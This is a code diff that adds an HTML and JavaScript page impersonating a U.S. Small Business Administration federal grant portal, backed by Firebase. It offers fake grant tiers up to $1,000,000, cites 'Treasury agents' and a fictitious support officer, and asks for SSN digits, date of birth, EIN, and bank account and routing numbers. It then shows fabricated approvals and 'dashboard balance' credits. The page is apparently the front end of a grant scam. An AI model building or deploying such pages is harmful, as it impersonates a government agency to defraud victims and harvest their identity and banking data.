@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SBA | Enrollment Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@300;400;600;700;900&display=swap');
+        
+        :root { 
+            --sba-blue: #00274c; 
+            --sba-accent: #0071bc; 
+            --sba-gold: #b69121;
+            --sba-red: #cc0000;
+            --bg-light: #f1f5f9;
+            --text-main: #1e293b;
+            --text-muted: #64748b;
+            --success: #15803d;
+            --pending: #92400e;
+            --danger: #dc2626;
+            --white: #ffffff;
+        }
+
+        * { 
+            box-sizing: border-box; 
+            -webkit-tap-highlight-color: transparent; 
+            font-family: 'Public Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body { 
+            background: var(--bg-light); 
+            margin: 0; 
+            padding: 0;
+            color: var(--text-main);
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+            padding-bottom: 90px;
+        }
+
+        header { 
+            background: white; 
+            padding: 16px 24px; 
+            display: flex; 
+            align-items: center; 
+            border-bottom: 3px solid var(--sba-red); 
+            position: sticky; 
+            top: 0; 
+            z-index: 100; 
+            box-shadow: 0 2px 10px rgba(0,0,0,0.03);
+        }
+
+        .logo-box { 
+            width: 42px; 
+            height: 42px; 
+            border-top: 3.5px solid var(--sba-blue); 
+            border-left: 3.5px solid var(--sba-blue); 
+            border-right: 3.5px solid var(--sba-blue); 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            position: relative; 
+        }
+        .logo-box::after { 
+            content: ''; 
+            position: absolute; 
+            bottom: 0; 
+            left: 0; 
+            width: 100%; 
+            height: 3.5px; 
+            background: var(--sba-red); 
+        }
+
+        .form-card { 
+            background: white; 
+            border-radius: 12px; 
+            border: 1px solid #e2e8f0; 
+            box-shadow: 0 4px 20px rgba(0,0,0,0.04); 
+            padding: 24px;
+        }
+
+        .section-label { 
+            font-size: 10px; 
+            font-weight: 900; 
+            color: var(--sba-blue); 
+            text-transform: uppercase; 
+            background: #f8fafc; 
+            padding: 8px 14px; 
+            border-radius: 6px; 
+            display: block; 
+            margin: 24px 0 16px; 
+            border-left: 4px solid var(--sba-blue); 
+            letter-spacing: 0.05em;
+        }
+
+        label { 
+            display: block; 
+            font-size: 10px; 
+            font-weight: 700; 
+            color: #64748b; 
+            text-transform: uppercase; 
+            margin-bottom: 6px; 
+            letter-spacing: 0.02em;
+        }
+
+        .field { 
+            width: 100%; 
+            height: 48px; 
+            border: 1.5px solid #cbd5e1; 
+            border-radius: 8px; 
+            padding: 0 14px; 
+            font-size: 13px; 
+            font-weight: 600; 
+            outline: none; 
+            transition: all 0.2s; 
+        }
+        .field:focus { 
+            border-color: var(--sba-blue); 
+            background: #f8fafc; 
+            box-shadow: 0 0 0 3px rgba(0, 39, 76, 0.1);
+        }
+
+        textarea.field {
+            height: 90px;
+            padding-top: 12px;
+            resize: none;
+        }
+
+        .btn-submit { 
+            background: var(--sba-blue); 
+            color: white; 
+            width: 100%; 
+            padding: 18px; 
+            border-radius: 8px; 
+            font-weight: 900; 
+            text-transform: uppercase; 
+            font-size: 12px; 
+            margin-top: 28px; 
+            box-shadow: 0 4px 15px rgba(0,46,109,0.25);
+            letter-spacing: 0.05em;
+            transition: all 0.2s;
+        }
+        .btn-submit:hover {
+            background: #001f40;
+            transform: translateY(-1px);
+        }
+
+        .loader { 
+            width: 44px; 
+            height: 44px; 
+            border: 4px solid #f1f5f9; 
+            border-top: 4px solid var(--sba-blue); 
+            border-radius: 50%; 
+            animation: spin 1s linear infinite; 
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+
+        /* Support Styling */
+        .support-footer { 
+            margin-top: 32px; 
+            padding-top: 20px; 
+            border-top: 1px dashed #cbd5e1; 
+            display: flex; 
+            align-items: center; 
+            justify-content: space-between; 
+            gap: 12px; 
+            cursor: pointer; 
+            transition: 0.2s; 
+        }
+        .support-footer:active { 
+            opacity: 0.7; 
+            transform: scale(0.98); 
+        }
+        .officer-avatar { 
+            width: 46px; 
+            height: 46px; 
+            border-radius: 10px; 
+            object-fit: cover; 
+            border: 2px solid #10b981; 
+        }
+        .headset-icon-box { 
+            width: 38px; 
+            height: 38px; 
+            background: #f1f5f9; 
+            border-radius: 50%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            color: var(--sba-blue); 
+            font-size: 13px; 
+            border: 1px solid #e2e8f0; 
+        }
+        
+        .fab-support { 
+            position: fixed; 
+            bottom: 30px; 
+            right: 24px; 
+            width: 56px; 
+            height: 56px; 
+            background: var(--sba-blue); 
+            color: white; 
+            border-radius: 50%; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            font-size: 20px; 
+            box-shadow: 0 6px 20px rgba(0,0,0,0.3); 
+            border: 2px solid white; 
+            z-index: 999; 
+            cursor: pointer; 
+            transition: all 0.2s;
+        }
+        .fab-support:hover {
+            transform: scale(1.05);
+        }
+    </style>
+</head>
+<body class="pb-32">
+
+    <header>
+        <div class="logo-box cursor-pointer" onclick="location.href='dashboard.html'">
+            <span class="font-black text-blue-900 text-[10px]">SBA</span>
+        </div>
+        <div class="ml-3 border-l pl-3 py-1">
+            <p class="text-[9px] font-extrabold text-slate-500 uppercase leading-tight tracking-wide">U.S. Small Business<br>Administration</p>
+        </div>
+    </header>
+
+    <main class="max-w-lg mx-auto px-4 mt-8">
+        <div class="form-card">
+            
+            <div id="applyForm" class="hidden">
+                <div id="declineNotice" class="hidden mb-6 p-4 bg-rose-50 border-l-4 border-rose-500 rounded">
+                    <p class="text-[10px] font-black text-rose-600 uppercase tracking-wide">Application Rejected</p>
+                    <p id="declineReason" class="text-xs font-bold text-rose-800 mt-1"></p>
+                </div>
+
+                <h1 class="text-xl font-extrabold text-slate-800 tracking-tight">Enrollment Portal</h1>
+                <p class="text-[9px] text-slate-400 font-black uppercase mb-6 tracking-widest">Form 424-B | Federal Grant Application</p>
+
+                <div class="section-label">1. Identity & Contact</div>
+                <div class="mb-4">
+                    <label>Full Legal Name</label>
+                    <input type="text" id="fullName" class="field" placeholder="John Doe">
+                </div>
+                <div class="grid grid-cols-2 gap-4 mb-4">
+                    <div>
+                        <label>Date of Birth</label>
+                        <input type="date" id="dob" class="field">
+                    </div>
+                    <div>
+                        <label>SSN (Last 4)</label>
+                        <input type="password" id="ssn" class="field" placeholder="****">
+                    </div>
+                </div>
+                <div class="mb-4">
+                    <label>Home Address</label>
+                    <input type="text" id="address" class="field" placeholder="123 Federal Way, DC">
+                </div>
+
+                <div class="section-label">2. Business Profile</div>
+                <div class="mb-4">
+                    <label>Legal Business Name</label>
+                    <input type="text" id="bizName" class="field" placeholder="LLC or Corp Name">
+                </div>
+                <div class="grid grid-cols-2 gap-4 mb-4">
+                    <div>
+                        <label>Business Type</label>
+                        <select id="bizType" class="field">
+                            <option value="sole">Sole Proprietor</option>
+                            <option value="llc">LLC</option>
+                            <option value="corp">Corporation</option>
+                            <option value="ngo">Non-Profit</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label>Years in Business</label>
+                        <input type="number" id="bizYears" class="field" placeholder="0">
+                    </div>
+                </div>
+                <div class="mb-4">
+                    <label>Tax ID / EIN</label>
+                    <input type="text" id="ein" class="field" placeholder="XX-XXXXXXX">
+                </div>
+
+                <div class="section-label">3. Employment & Income</div>
+                <div class="mb-4">
+                    <label>Current Occupation</label>
+                    <input type="text" id="job" class="field" placeholder="Business Owner">
+                </div>
+                <div class="mb-4">
+                    <label>Annual Household Income</label>
+                    <select id="income" class="field">
+                        <option value="under20k">Under $20,000</option>
+                        <option value="20k-50k">$20,000 - $50,000</option>
+                        <option value="50k-100k">$50,000 - $100,000</option>
+                        <option value="over100k">$100,000+</option>
+                    </select>
+                </div>
+
+                <div class="section-label">4. Funding Request</div>
+                <div class="mb-4">
+                    <label>Select Grant Program</label>
+                    <select id="reqAmount" class="field border-blue-300 bg-sky-50/30 font-black">
+                        <option value="50000">$50,000.00 — Relief Advance</option>
+                        <option value="150000">$150,000.00 — Business Standard</option>
+                        <option value="500000">$500,000.00 — Silver Award</option>
+                        <option value="1000000">$1,000,000.00 — Platinum Tier</option>
+                    </select>
+                </div>
+                <div class="mb-4">
+                    <label>Purpose of Funds</label>
+                    <textarea id="purpose" class="field py-3" placeholder="Explain how this grant helps your business..."></textarea>
+                </div>
+
+                <div class="section-label">5. Disbursement (Bank Info)</div>
+                <div class="mb-4">
+                    <label>Bank Name</label>
+                    <input type="text" id="bankName" class="field" placeholder="Chase, BofA, etc.">
+                </div>
+                <div class="grid grid-cols-2 gap-4 mb-4">
+                    <div>
+                        <label>Account Number</label>
+                        <input type="tel" id="accNum" class="field">
+                    </div>
+                    <div>
+                        <label>Routing Number</label>
+                        <input type="tel" id="rtNum" class="field">
+                    </div>
+                </div>
+
+                <button onclick="submitData()" id="subBtn" class="btn-submit">Certify & Submit Application</button>
+            </div>
+
+            <div id="pendingView" class="hidden py-16 text-center">
+                <div class="loader mx-auto mb-6"></div>
+                <h2 class="text-lg font-black text-slate-800 uppercase tracking-tighter">Under Review</h2>
+                <p class="text-[10px] text-slate-400 font-bold uppercase mt-2 px-6 italic">Treasury agents are verifying your payroll records. This usually takes 2-4 hours.</p>
+            </div>
+
+            <div id="successView" class="hidden py-10 text-center">
+                <div class="w-16 h-16 bg-emerald-500 rounded-full flex items-center justify-center text-white text-2xl mx-auto mb-4 shadow-lg"><i class="fas fa-check"></i></div>
+                <h2 class="text-xl font-extrabold text-emerald-600 uppercase tracking-tighter">Application Approved</h2>
+                <p class="text-[10px] text-slate-400 font-bold uppercase mt-2">The requested funds have been added to your dashboard balance.</p>
+                <div class="flex flex-col gap-3 mt-8">
+                    <a href="dashboard.html" class="bg-slate-900 text-white py-4 rounded-lg font-bold uppercase text-[11px] tracking-wide">Go to Dashboard</a>
+                    <button onclick="resetApplication()" class="text-slate-400 font-bold text-[9px] uppercase underline">Start New Filing</button>
+                </div>
+            </div>
+
+            <div class="support-footer" onclick="location.href='support.html'">
+                <div class="flex items-center gap-3">
+                    <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?q=80&w=120" class="officer-avatar" alt="Support Agent">
+                    <div>
+                        <p class="text-[11px] font-black text-slate-800 uppercase leading-none mb-1">Officer Sarah Miller</p>
+                        <p class="text-[9px] font-black text-emerald-600 uppercase tracking-tighter">Online • Click to chat with agent</p>
+                    </div>
+                </div>
+                <div class="headset-icon-box">
+                    <i class="fas fa-headset"></i>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <div class="fab-support" onclick="location.href='support.html'">
+        <i class="fas fa-headset"></i>
+    </div>
+
+    <script type="module">
+        import { auth, db } from './firebase-config.js';
+        import { doc, onSnapshot, updateDoc, increment, arrayUnion } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+        import { onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+
+        onAuthStateChanged(auth, (user) => {
+            if (!user) { window.location.href = 'login.html'; return; }
+            
+            onSnapshot(doc(db, "users", user.uid), async (snap) => {
+                const d = snap.data();
+                if(!d) return;
+
+                ['applyForm', 'pendingView', 'successView'].forEach(id => document.getElementById(id).classList.add('hidden'));
+
+                if (d.applyStatus === "SUCCESSFUL") {
+                    document.getElementById('successView').classList.remove('hidden');
+                } else if (d.applyStatus === "PENDING") {
+                    document.getElementById('pendingView').classList.remove('hidden');
+                } else if (d.applyStatus === "FAILED") {
+                    document.getElementById('applyForm').classList.remove('hidden');
+                    document.getElementById('declineNotice').classList.remove('hidden');
+                    document.getElementById('declineReason').innerText = d.applyReason || "Information verification failed.";
+                    document.getElementById('subBtn').innerText = "Resubmit Application";
+                } else {
+                    document.getElementById('applyForm').classList.remove('hidden');
+                }
+            });
+        });
+
+        window.submitData = async () => {
+            const btn = document.getElementById('subBtn');
+            const amt = Number(document.getElementById('reqAmount').value);
+            const user = auth.currentUser;
+            
+            if(!document.getElementById('fullName').value) return alert("Full Name Required");
+
+            btn.innerText = "AUTHENTICATING...";
+            btn.disabled = true;
+
+            const applicationData = {
+                applyStatus: "PENDING",
+                requestedAmount: amt,
+                fullName: document.getElementById('fullName').value,
+                history: arrayUnion({
+                    type: "GRANT APPLICATION",
+                    amount: amt,
+                    status: "PENDING",
+                    date: new Date().toISOString()
+                })
+            };
+
+            await updateDoc(doc(db, "users", user.uid), applicationData);
+        };
+
+        window.resetApplication = async () => {
+            if(confirm("Discard current approval and re-apply?")) {
+                await updateDoc(doc(db, "users", auth.currentUser.uid), { applyStatus: "IDLE" });
+            }
+        };
+    </script>
+</body>
+</html>
